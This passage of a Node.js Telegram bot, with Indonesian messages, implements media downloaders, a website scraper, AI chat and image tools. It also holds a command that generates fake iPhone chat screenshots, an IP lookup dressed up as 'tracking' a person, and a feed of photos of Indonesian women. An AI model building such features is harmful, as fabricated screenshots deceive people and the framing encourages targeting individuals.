          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/^\/ssip(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const input = match[1]
  const senderId = msg.from.id
  const userId = msg.from.id
  
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
      return bot.sendMessage(
        chatId, 
        "❌ ☇ Lu Siapa Dongok", 
        { reply_to_message_id: msg.message_id }
      )
    }
    
  if (!input) {
    return bot.sendMessage(chatId,
      "🪧 ☇ Format Valid :\n\nContoh:\n`/ssip Name | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "HTML" }
    )
  }

  const parts = input.split("|").map(p => p.trim())
  const text = parts[0]
  const time = parts[1] || "00:00"
  const battery = parts[2] || "100"
  const carrier = parts[3] || "TELKOMSEL"

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`

  try {
    await bot.sendChatAction(chatId, "upload_photo")

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" })
    const buffer = Buffer.from(response.data, "binary")

    await bot.sendPhoto(chatId, buffer, {
      caption: `
<blockquote>「 ⚆ 」IPhone Generate</blockquote>
Chat : \`${text}\`
Time : ${time}
Baterry : ${battery}%
Kartu : ${carrier}
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 αµƭɦσɾ 」", url: "https://t.me/Popyeyeye" }]
        ]
      }
    })
  } catch (err) {
    console.error(err.message)
    bot.sendMessage(chatId, "❌ ☇ Terjadi kesalahan saat memproses gambar.")
  }
})

bot.onText(/\/uploadghp/, async (msg) => {
    const chatId = msg.chat.id
    const fromId = msg.from.id
    const userId = msg.from.id
    
    if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
      return bot.sendMessage(
        chatId, 
        "❌ ☇ Lu Siapa Dongok", 
        { reply_to_message_id: msg.message_id }
      )
    }
    
    const GITHUB_STORAGE = "username/repo";
    const BRANCH = "main";
    const MEK_TOKEN = "github_token_here";
    
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '🪧 ☇ Format Valid /uploadghp reply Image')
    }

    const repliedMsg = msg.reply_to_message
    
    if (!repliedMsg.photo && !repliedMsg.video) {
        return bot.sendMessage(chatId, '❌ ☇ Reply your photo dan video')
    }

    try {
        await bot.sendMessage(chatId, '⏳ ☇ Tunggu...')

        let fileId, mimeType

        if (repliedMsg.photo) {
            fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id
            
            mimeType = 'image/jpeg' 
        } else {
            fileId = repliedMsg.video.file_id
            mimeType = 'video/mp4' 
        }
        
        const fileExtension = mimeType.includes('image') ? 'jpg' : 'mp4'
        const fileName = `${mimeType.includes('image') ? 'photo' : 'video'}_${Date.now()}.${fileExtension}`


        const fileInfo = await bot.getFile(fileId)
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}` 
        
        const response = await axios.get(fileUrl, { 
            responseType: 'arraybuffer' 
        })
        
        const fileBuffer = Buffer.from(response.data)

        const contentBase64 = fileBuffer.toString('base64')
        
        const githubResponse = await axios.put(
            `https://api.github.com/repos/${GITHUB_STORAGE}/contents/${fileName}`,
            {
                message: `Upload ${fileName} via Telegram Bot`,
                content: contentBase64,
                branch: BRANCH
            },
            {
                headers: {
                    'Authorization': `token ${MEK_TOKEN}`,
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.github.v3+json'
                }
            }
        )

        const downloadUrl = githubResponse.data.content.download_url
        await bot.sendMessage(chatId, `
✅ ☇ Berhasil diunggah!
URL: ${downloadUrl}`, {
            reply_to_message_id: repliedMsg.message_id
        })

    } catch (error) {
        console.error('GITHUB UPLOAD ERROR:', error.response?.data || error.message)
        
        let errorMsg = '❌ ☇ Upload gagal. '
        
        if (error.response?.status === 401) {
            errorMsg += 'Token GitHub salah atau tidak memiliki izin tulis (401 Unauthorized).'
        } else if (error.response?.status === 404) {
            errorMsg += 'Repositori tidak ditemukan (404 Not Found) atau nama branch salah.'
        } else if (error.response?.status === 422) {
             errorMsg += 'Kesalahan pemrosesan (422 Unprocessable Entity). Mungkin file terlalu besar atau format Base64 salah.'
        } else {
            errorMsg += 'Terjadi kesalahan tidak terduga. Cek konsol server.'
        }
        
        await bot.sendMessage(chatId, errorMsg)
    }
})

// Fungsi hitung kecocokan (pakai hash sederhana)
function cekJodoh(nama1, nama2) {
  const gabungan = (nama1 + nama2).toLowerCase();
  let skor = 0;

  for (let i = 0; i < gabungan.length; i++) {
    skor += gabungan.charCodeAt(i);
  }

  return skor % 101; // hasil 0–100%
}

// Command /cekjodoh Nama1 | Nama2
bot.onText(/\/cekjodoh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!match[1].includes('|')) {
    return bot.sendMessage(
      chatId,
      '❌ Format salah!\nGunakan:\n/cekjodoh NamaKamu | NamaDia'
    );
  }

  const [nama1, nama2] = match[1].split('|').map(n => n.trim());

  if (!nama1 || !nama2) {
    return bot.sendMessage(chatId, '❌ Nama tidak boleh kosong!');
  }

  const hasil = cekJodoh(nama1, nama2);

  let keterangan = '';
  if (hasil >= 80) keterangan = '💖 Jodoh dunia akhirat!';
  else if (hasil >= 60) keterangan = '😍 Cocok banget!';
  else if (hasil >= 40) keterangan = '🙂 Lumayan cocok';
  else if (hasil >= 20) keterangan = '😅 Perlu perjuangan';
  else keterangan = '💔 Gk Bakal 😂';

  const response = `
❤️ *CEK JODOH* ❤️

👤 ${nama1}
👤 ${nama2}

📊 Kecocokan: *${hasil}%*
${keterangan}
  `;

  bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});


bot.onText(/^\/tiktokdl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const userId = msg.from.id
  const args = match[1]?.trim()
  
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
      return bot.sendMessage(
        chatId, 
        "❌ ☇ Lu bukan premium tolol", 
        { reply_to_message_id: msg.message_id }
      )
    }
    
  if (!args)
    return bot.sendMessage(
      chatId,
      "🪧 ☇ Format Valid : /tiktokdl https://example.com/"
    )

  let url = args

  if (msg.entities) {
    for (const e of msg.entities) {
      if (e.type === "url") {
        url = msg.text.substring(e.offset, e.offset + e.length)
        break
      }
    }
  }

  const wait = await bot.sendMessage(chatId, "⏳ Tunggu...")

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    })

    if (!data || data.code !== 0 || !data.data)
      return bot.sendMessage(chatId, "❌ ☇ Gagal ambil data video, pastikan link valid")

    const d = data.data

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10)
      const media = []

      for (const img of imgs) {
        const res = await axios.get(img, { responseType: "arraybuffer" })
        media.push({
          type: "photo",
          media: { source: Buffer.from(res.data) }
        })
      }

      await bot.sendMediaGroup(chatId, media)
      return
    }

    const videoUrl = d.play || d.hdplay || d.wmplay
    if (!videoUrl)
      return bot.sendMessage(chatId, "❌ ☇ Tidak ada link video yang bisa diunduh")

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    })

    await bot.sendAnimation(
      chatId,
      Buffer.from(video.data),
      { supports_streaming: true },
      { filename: `${d.id || Date.now()}.mp4` }
    )
  } catch (e) {
    const errMsg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
      : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah"
    await bot.sendMessage(chatId, errMsg)
  } finally {
    try {
      await bot.deleteMessage(chatId, wait.message_id)
    } catch {}
  }
})

bot.onText(/^\/ipinfo(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const userId = msg.from.id
  const ip = match && match[1] ? match[1].trim() : null
  
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
      return bot.sendMessage(
        chatId, 
        "❌ ☇ Lu Siapa Dongok", 
        { reply_to_message_id: msg.message_id }
      )
    }
  
  if (!ip) {
    return bot.sendMessage(chatId, "🪧 ☇ Format Valid : /ipinfo 8.8.8.8")
  }

  function isValidIPv4(ip) {
    const parts = ip.split(".")
    if (parts.length !== 4) return false
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false
      if (p.length > 1 && p.startsWith("0")) return false
      const n = Number(p)
      return n >= 0 && n <= 255
    })
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/
    return ipv6Regex.test(ip)
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return bot.sendMessage(chatId, "❌ ☇ IP tidak valid. Masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar.")
  }

  let processingMsg = await bot.sendMessage(chatId, `🔎 ☇ Tracking IP ${ip} — sedang memproses...`)

  try {
    const steps = [
      { p: 10, text: "MENYIAPKAN KONEKSI SERVER..." },
      { p: 30, text: "MENGAMBIL DATA IP..." },
      { p: 50, text: "MENGANALISIS LOKASI IP..." },
      { p: 75, text: "MENYUSUN HASIL AKHIR..." },
      { p: 100, text: "SELESAI TO TRACKING IP" }
    ]

    for (const step of steps) {
      await new Promise(r => setTimeout(r, 400 + Math.random() * 300))
      await bot.editMessageText(
        `🔎 ☇ Tracking IP ${ip}\n${step.p}% ${step.text}`,
        { chat_id: chatId, message_id: processingMsg.message_id }
      ).catch(() => {})
    }

    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 })
    const data = res.data

    if (!data || data.success === false) {
      return bot.editMessageText(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`, {
        chat_id: chatId,
        message_id: processingMsg.message_id
      })
    }

    const lat = data.latitude || ""
    const lon = data.longitude || ""
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}` : null

    const caption = `<blockquote>
⬡═―—⊱ ⎧ MBAPE NIH ⎭ ⊰―—═⬡</blockquote>
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim()

    const options = {
      parse_mode: "HTML",
      reply_markup: mapsUrl
        ? {
            inline_keyboard: [
              [{ text: "⌜ Lokasi ⌟ ☇ 𝖧𝖾𝗋𝖾", url: mapsUrl }]
            ]
          }
        : undefined
    }

    await bot.editMessageText(caption, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
      ...options
    }).catch(async () => {
      await bot.sendMessage(chatId, caption, options)
    })

  } catch (err) {
    console.error("TrackIP Error:", err)
    await bot.editMessageText(
      "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti.",
      { chat_id: chatId, message_id: processingMsg.message_id }
    ).catch(async () => {
      await bot.sendMessage(chatId, "❌ ☇ Terjadi kesalahan saat mengambil data IP.")
    })
  }
})

const aiUsers = new Set()

bot.onText(/^\/chatai(?:@[\w_]+)?(?: (.*))?/, async (msg, match) => {
    const chatId = msg.chat.id
    const fromId = msg.from.id
    const userId = msg.from.id
    
    if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
      return bot.sendMessage(
        chatId, 
        "❌ ☇ Lu Siapa Dongok", 
        { reply_to_message_id: msg.message_id }
      )
    }
  
    aiUsers.add(userId)

    let prompt = match[1]?.trim()
    const reply = msg.reply_to_message

    if (!prompt && reply && reply.from.id === bot.botInfo.id) {
        prompt = reply.text
    }

    if (reply) {
        if (reply.text) {
            prompt = `✅ ☇ Perbaiki atau lanjutkan teks berikut : ${reply.text}`
        }

        if (reply.document) {
            const file = await bot.getFile(reply.document.file_id)
            const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
            prompt = `Perbaiki FILE berikut:\n${fileUrl}`
        }

        if (reply.photo) {
            const photo = reply.photo[reply.photo.length - 1]
            const file = await bot.getFile(photo.file_id)
            const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
            prompt = `✅ ☇ Perbaiki kualitas foto berikut dan kirimkan hasilnya : ${fileUrl}`
        }
    }

    if (!prompt) {
        return bot.sendMessage(chatId, "🪧 Format Valid : /chatai Message", {
            parse_mode: "HTML"
        })
    }

    const waitMsg = await bot.sendMessage(chatId, "⏳ Tunggu...")

    try {
        const apiURL = `https://api.ootaizumi.web.id/ai/copilot?prompt=${encodeURIComponent(prompt)}`
        const res = await fetch(apiURL)
        const data = await res.json()

        const aiText = data.result?.text || data.result || ""

        const fileRegex = /FILE:\s*(https?:\/\/\S+)/i
        const fileMatch = aiText.match(fileRegex)

        if (fileMatch) {
            await bot.editMessageText("✅ ☇ Sending File...", {
                chat_id: chatId,
                message_id: waitMsg.message_id
            })

            return bot.sendDocument(chatId, fileMatch[1])
        }

        const imgRegex = /IMAGE:\s*(https?:\/\/\S+)/i
        const imgMatch = aiText.match(imgRegex)

        if (imgMatch) {
            await bot.editMessageText("✅ ☇ Sending Photo...", {
                chat_id: chatId,
                message_id: waitMsg.message_id
            })

            return bot.sendPhoto(chatId, imgMatch[1])
        }

        await bot.editMessageText(aiText, {
            chat_id: chatId,
            message_id: waitMsg.message_id
        })

    } catch (err) {
        console.error(err)
        await bot.editMessageText("❌ ☇ Terjadi kesalahan. Silakan coba lagi.", {
            chat_id: chatId,
            message_id: waitMsg.message_id
        })
    }
})

//ceindo

bot.onText(/^\/ceindo$/i, async (msg) => {
  const chatId = msg.chat.id;
  const apiUrl = "https://api.nekolabs.web.id/random/girl/indonesia";

  // Kirim pesan "processing"
  const waitMsg = await bot.sendMessage(chatId, `\`\`\`
◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴘʀᴏᴄᴇssɪɴɢ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❯ sᴛᴀᴛᴜs: ᴡᴀɪᴛ ᴋᴀᴋ......
❯ ᴘʀᴏsᴇs: ᴍᴇɴᴄᴀʀɪ ᴄᴇᴄᴀɴ ɪɴᴅᴏ...
◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
\`\`\``, { parse_mode: "MarkdownV2" });

  try {
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    // Hapus pesan loading
    await bot.deleteMessage(chatId, waitMsg.message_id);

    // Kirim hasil foto
    await bot.sendPhoto(chatId, buffer, {
      caption: `\`\`\`
◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
 🇮🇩 ʀᴀɴᴅᴏᴍ ᴄᴇᴄᴀɴ ɪɴᴅᴏɴᴇsɪᴀ 🇮🇩
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❯ sᴏᴜʀᴄᴇ: ɴᴇᴋᴏʟᴀʙs
❯ sᴛᴀᴛᴜs: sᴜᴄᴄᴇss ✅
◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
\`\`\``,
      parse_mode: "MarkdownV2",
    });
  } catch (e) {
    console.error("Error /cecanindo:", e.message);
    await bot.sendMessage(
      chatId,
      `⚠️ *Gagal mengambil gambar cecan Indonesia*\n_Error:_ ${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

// get code coek
bot.onText(/^\/getcode(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const userId = msg.from.id
  const url = match[1] ? match[1].trim() : null
  
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
      return bot.sendMessage(
        chatId, 
        "❌ ☇ Lu Siapa Dongok", 
        { reply_to_message_id: msg.message_id }
      )
    }

  if (!url) {
    return bot.sendMessage(
      chatId,
      "🪧 ☇ Format Valid : /getcode https://example.com"
    )
  }

  if (!/^https?:\/\/.+/i.test(url)) {
    return bot.sendMessage(chatId, "❌ ☇ Link tidak valid")
  }

  const loading = await bot.sendMessage(chatId, "⏳ Tunggu...")

  try {
    const headRes = await fetch(url, { method: "HEAD" })
    const contentType = headRes.headers.get("content-type") || ""
    const extMatch = url.match(/\.(\w+)$/i)
    const ext = extMatch ? extMatch[1].toLowerCase() : ""

    const isHTML = contentType.includes("text/html") || ext === "html" || ext === ""

    if (isHTML) {
      const res = await fetch(url)
      const html = await res.text()
      const tmpDir = path.join("./tmp", `site-${Date.now()}`)
      fs.mkdirSync(tmpDir, { recursive: true })

      fs.writeFileSync(path.join(tmpDir, "index.html"), html)

      const $ = cheerio.load(html)
      const resources = new Set()

      $("link[href], script[src], img[src]").each((_, el) => {
        const attr = $(el).attr("href") || $(el).attr("src")
        if (attr && !attr.startsWith("data:")) {
          const fullUrl = new URL(attr, url).href
          resources.add(fullUrl)
        }
      })

      for (const resUrl of resources) {
        try {
          const fileRes = await fetch(resUrl)
          if (!fileRes.ok) continue
          const buffer = await fileRes.arrayBuffer()
          const filePath = path.join(tmpDir, path.basename(resUrl.split("?")[0]))
          fs.writeFileSync(filePath, Buffer.from(buffer))
        } catch {
          continue
        }
      }

      const zip = new AdmZip()
      zip.addLocalFolder(tmpDir)
      const zipPath = path.join("./tmp", `source-${Date.now()}.zip`)
      zip.writeZip(zipPath)

      await bot.sendDocument(chatId, zipPath, {}, { filename: "source.zip" })

      fs.rmSync(tmpDir, { recursive: true, force: true })
      fs.unlinkSync(zipPath)

      await bot.editMessageText("☄ Website dikumpulkan & dikirim sebagai ZIP.", {
        chat_id: chatId,
        message_id: loading.message_id
      })

    } else {
      const res = await fetch(url)
      if (!res.ok) throw new Error(`Gagal mengambil file status ${res.status}`)

      const buffer = await res.arrayBuffer()
      const extFile = ext || "txt"
      const fileName = `code-${Date.now()}.${extFile}`
      const filePath = path.join("./tmp", fileName)
      fs.mkdirSync("./tmp", { recursive: true })
      fs.writeFileSync(filePath, Buffer.from(buffer))

      await bot.sendDocument(chatId, filePath, {}, { filename: fileName })
      fs.unlinkSync(filePath)

      await bot.editMessageText("☇ File tunggal berhasil diunduh dan dikirim.", {
        chat_id: chatId,
        message_id: loading.message_id
      })
    }

  } catch (err) {
    console.error("❌ ☇ Gagal ambil kode:", err)
    await bot.editMessageText(`❌ ☇ Gagal mengambil: ${err.message}`, {
      chat_id: chatId,
      message_id: loading.message_id
    })
  }
})

// buat to hd ya wee
async function Pxpic(path, func) {
  const tool = ['removebg', 'enhance', 'upscale', 'restore', 'colorize'];
  if (!tool.includes(func)) return null;

  const buffer = fs.readFileSync(path);
  const fileInfo = await fromBuffer(buffer);
  const ext = fileInfo?.ext || 'jpg';
  const mime = fileInfo?.mime || 'image/jpeg';
  const fileName = Math.random().toString(36).slice(2, 8) + '.' + ext;

  const { data } = await axios.post("https://pxpic.com/getSignedUrl", {
    folder: "uploads",
    fileName
  });

  await axios.put(data.presignedUrl, buffer, {
    headers: { "Content-Type": mime }
  });

  const url = "https://files.fotoenhancer.com/uploads/" + fileName;

  const api = await axios.post("https://pxpic.com/callAiFunction", new URLSearchParams({
    imageUrl: url,
    targetFormat: 'png',
    needCompress: 'no',
    imageQuality: '100',
    compressLevel: '6',
    fileOriginalExtension: 'png',
    aiFunction: func,
    upscalingLevel: ''
  }).toString(), {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0',
      'accept-language': 'id-ID'
    }
  });

  return api.data;
}

async function remini(imagePath) {
  return new Promise((resolve, reject) => {
    const form = new FormData();
    form.append('model_version', 1);
    form.append('image', fs.readFileSync(imagePath), {
      filename: 'image.jpg',
      contentType: 'image/jpeg'
    });

    const req = form.submit({
      protocol: 'https:',
      host: 'inferenceengine.vyro.ai',
      path: '/enhance',
      headers: {
        'User-Agent': 'okhttp/4.9.3',
        'Accept-Encoding': 'gzip'
      }
    }, (err, res) => {
      if (err) return reject(err);
      const chunks = [];
      res.on('data', chunk => chunks.push(chunk));
      res.on('end', () => resolve(Buffer.concat(chunks)));
      res.on('error', reject);
    });
  });
}
  bot.onText(/^\/tohd$/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const messageId = msg.message_id;
    
    if (!msg.reply_to_message || !msg.reply_to_message.photo) {
      return bot.sendMessage(chatId, '📸 Balas gambar dengan perintah /tohd\nᴄʀᴇᴀᴛᴇ ʙʏ ᴢᴏʀᴏ⸙', { reply_to_message_id: messageId });
    }

    const photo = msg.reply_to_message.photo.slice(-1)[0]; 
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const tempFile = `./temp_${Date.now()}.jpg`;

    try {
      
      const res = await axios.get(fileUrl, { responseType: 'arraybuffer' });
      fs.writeFileSync(tempFile, res.data);

      
      const hasil = await Pxpic(tempFile, 'enhance');
      if (hasil?.resultImageUrl) {
        await bot.sendPhoto(chatId, hasil.resultImageUrl, {
          caption: '(⸙) Gambar berhasil di-HD-kan\nᴄʀᴇᴀᴛᴇ ʙʏ ᴢᴏʀᴏ⸙',
          reply_to_message_id: messageId
        });
        return fs.unlinkSync(tempFile);
      }

      
      const fallback = await remini(tempFile);
      if (fallback) {
        await bot.sendPhoto(chatId, fallback, {
          caption: '(⸙) HD Success\nᴄʀᴇᴀᴛᴇ ʙʏ ᴢᴏʀᴏ⸙',
          reply_to_message_id: messageId
        });
      } else {
        await bot.sendMessage(chatId, '⦸ Gagal meningkatkan kualitas gambar.', {
          reply_to_message_id: messageId
        });
      }

      fs.unlinkSync(tempFile);
    } catch (err) {
      if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
      await bot.sendMessage(chatId, '⎈ Terjadi kesalahan: ' + err.message, {
        reply_to_message_id: messageId
      });
    }
  });
  
  const tiktokCache = new Map();

bot.onText(/^\/tiktoksearch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const keyword = match[1].trim();

  if (!keyword) {
    return bot.sendMessage(
      chatId,
      "❌ Masukkan kata kunci!\nContoh: `/tiktoksearch bot edit`",
      { parse_mode: "Markdown" }
    );
  }

  const loading = await bot.sendMessage(chatId, "⸙ SEARCHING VIDEO TIKTOK......");

  try {
    const searchUrl = `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(keyword)}&count=5`;
    const res = await axios.get(searchUrl, { timeout: 20000 });
    const data = res.data;

    const videos =
      data.data?.videos ||
      data.data?.list ||
      data.data?.aweme_list ||
      data.data ||
      [];

    if (!Array.isArray(videos) || videos.length === 0) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return bot.sendMessage(chatId, "⚠️ Tidak ada hasil ditemukan untuk kata kunci tersebut.");
    }

    const topVideos = videos.slice(0, 5);

    const uniqueKey = Math.random().toString(36).substring(2, 10);
    tiktokCache.set(uniqueKey, topVideos);

    const keyboard = topVideos.map((v, i) => {
      const title = (v.title || "Tanpa Judul").slice(0, 35);
      return [
        { text: `${i + 1}. ${title}`, callback_data: `tiktok|${uniqueKey}|${i}` },
      ];
    });

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await bot.sendMessage(
      chatId,
      `⸙ Ditemukan *${topVideos.length}* hasil untuk:\n\`${keyword}\`\nPilih salah satu video di bawah ini:`,
      {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      }
    );
  } catch (err) {
    console.error("❌ TikTok Search Error:", err.message);
    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    bot.sendMessage(chatId, "⚠️ Gagal mengambil hasil pencarian TikTok.");
  }
});
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (!data.startsWith("tiktok|")) return;

  await bot.answerCallbackQuery(query.id, { text: "⏳ MENGUNDUH VIDEO SABAR  CUK LOADING....." });

  const [, cacheKey, indexStr] = data.split("|");
  const index = parseInt(indexStr, 10);

  const cached = tiktokCache.get(cacheKey);
  if (!cached || !cached[index]) {
    return bot.sendMessage(chatId, "⚠️ Data video tidak ditemukan (cache kedaluwarsa).");
  }

  const v = cached[index];
  const author =
    v.author?.unique_id || v.author?.nickname || v.user?.unique_id || "unknown";
  const videoId = v.video_id || v.id || v.aweme_id || v.short_id || v.video?.id;
  const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

  try {
    const res = await axios.post(
      "https://www.tikwm.com/api/",
      `url=${encodeURIComponent(tiktokUrl)}`,
      {
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        timeout: 30000,
      }
    );

    const result = res.data;
    if (!result || result.code !== 0 || !result.data) {
      throw new Error("Video tidak valid.");
    }

    const vid = result.data;
    const videoUrl = vid.play || vid.hdplay || vid.wmplay || vid.play_addr;

    const caption = `\`\`\`
☀ bot Searching\`\`\`
Video : *${vid.title || "Video TikTok"}*
Author : @${vid.author?.unique_id || "unknown"}
Likes : ${vid.digg_count || 0} 
Comment : ${vid.comment_count || 0}
[🌐 Lihat di TikTok](${tiktokUrl})`;

    await bot.sendAnimation(chatId, videoUrl, {
      caption,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("❌ Gagal download:", err.message);
    bot.sendMessage(chatId, "⚠️ Gagal mengunduh video TikTok.");
  }
});


bot.onText(/^\/play(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(
      chatId, 
      "❌ ☇ Lu Bukan Premium Tolol", 
      { reply_to_message_id: msg.message_id }
    )
  }

  const query = match[1] ? match[1].trim() : ""
  
  if (!query)
    return bot.sendMessage(chatId, `🪧 ☇ Format Valid : /play Music`, {
      parse_mode: "HTML"
    })
   
  let results = null
  for (const api of API_SOURCES) {
    try {
      const { data } = await axios.get(
        `${api}/api/s/spotify?query=${encodeURIComponent(query)}`,
        { timeout: 15000 }
      )
      if (data?.status && data?.data?.length) {
        results = data.data
        break
      }
    } catch {
      continue
    }
  }

  if (!results)
    return bot.sendMessage(
      chatId,
      `❌ ☇ Tidak ditemukan hasil untuk: <b>${escapeHtml(query)}</b>`,
      { parse_mode: "HTML" }
    )

  trackCache.set(chatId, results)

  const keyboard = results.slice(0, 10).map((track, i) => [
    { text: `${i + 1}. ${track.title} — ${track.artist}`, callback_data: `dl_${i}` }
  ])

  return bot.sendMessage(chatId, `❀ SELECT MUSIC`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  })
})
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id
  const data = query.data
  if (!data.startsWith("dl_")) return

  const index = Number(data.split("_")[1])
  const list = trackCache.get(chatId)
  if (!list || !list[index])
    return bot.answerCallbackQuery(query.id, { text: "❌ ☇ Data tidak ditemukan" })

  const track = list[index]
  await bot.answerCallbackQuery(query.id, { text: `🎵 ${track.title}` })

  let mp3Link = null
  for (const api of API_SOURCES) {
    try {
      const { data } = await axios.get(
        `${api}/api/d/spotify?url=${encodeURIComponent(track.track_url || track.url)}`,
        { timeout: 20000 }
      )

      mp3Link =
        data?.data?.mp3DownloadLink ||
        data?.data?.download ||
        data?.data?.mp3 ||
        null

      if (mp3Link) break
    } catch {
      continue
    }
  }

  if (!mp3Link)
    return bot.sendMessage(chatId, `❌ ☇ Gagal mendapatkan link MP3`, { parse_mode: "HTML" })

  try {
    const fileResp = await axios.get(mp3Link, {
      responseType: "arraybuffer",
